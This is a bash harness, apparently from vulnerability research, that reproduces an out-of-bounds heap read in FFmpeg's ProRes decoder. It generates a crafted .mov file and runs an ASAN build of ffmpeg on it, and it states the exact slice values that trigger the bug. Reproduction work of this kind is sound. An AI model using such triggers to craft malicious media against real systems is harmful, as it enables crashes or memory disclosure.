#!/bin/bash
# run.sh - Execute VULN 001 PoC for proresdec.c OOB read
set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

BIN="/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg"

echo "[*] VULN 001: decode_slice_thread 2-byte OOB Heap Read (proresdec.c:665)"
echo "[*] Trigger: slice data_size=6, slice buf[0]=0x40 -> hdr_size=8 > 7"
echo ""

# Step 1: Generate the crafted .mov file
echo "[+] Generating crafted .mov file..."
python3 vuln_001_gen.py
echo ""

# Step 2: Run ffmpeg under ASAN
echo "[+] Running ffmpeg (ASAN build) with crafted input..."
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" \
    "$BIN" -i vuln_001_input.mov -f null - > vuln_001_result.txt 2>&1 || true

echo "[+] ffmpeg exited."
echo ""

# Step 3: Report summary
echo "=== vuln_001_result.txt (last 30 lines) ==="
tail -30 vuln_001_result.txt

if ls asan.log* 2>/dev/null | head -1 | grep -q .; then
    echo ""
    echo "=== ASAN log ==="
    cat asan.log* 2>/dev/null | head -60
fi

echo ""
echo "[+] Full output in vuln_001_result.txt"
